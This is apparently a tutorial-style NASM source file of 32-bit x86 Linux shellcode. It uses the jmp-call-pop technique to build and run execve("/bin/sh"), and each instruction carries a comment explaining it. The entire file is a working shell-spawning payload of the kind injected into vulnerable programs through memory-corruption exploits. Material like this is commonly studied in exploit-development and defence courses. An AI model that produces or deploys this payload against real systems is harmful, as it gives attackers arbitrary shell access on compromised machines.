; execve("/bin/sh", ["/bin/sh"], NULL)

BITS 32

section .text

_start:
	jmp short _str

_shspawn:
	xor eax, eax ; set eax to 0
	pop ebx ; get sh_str addr
	mov [ebx+7], al ; append \0 from last byte of eax to 7th byte of ebx (after "/bin/sh")
	mov [ebx+8], ebx ; append sh_str address (2nd arg of execve)
	mov [ebx+12], eax ; append 0x00000000 (3rd arg)
	mov al, 0x0b ; prepare <execve> call
	lea ecx, [ebx+8] ; load sh_str address in ecx
	lea edx, [ebx+12] ; load NULL (eax) in edx
	int 0x80 ; syscall
	
_str:
	call _shspawn ; thx to this call, the stack contains next instruction (sh_str addr)
	sh_str db "/bin/sh"
